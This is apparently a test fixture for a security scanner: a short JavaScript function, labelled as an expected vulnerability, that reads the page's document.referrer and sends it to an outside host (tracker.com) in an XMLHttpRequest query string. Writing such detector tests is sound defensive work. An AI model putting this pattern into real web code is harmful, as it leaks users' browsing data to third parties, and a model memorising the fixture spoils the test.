/**
 * Test: Data leak via XMLHttpRequest URL
 * Expected: VULNERABILITY - referrer to XHR
 */

function test() {
  var ref = document.referrer;
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://tracker.com?ref=' + ref);
  xhr.send();
}

test();
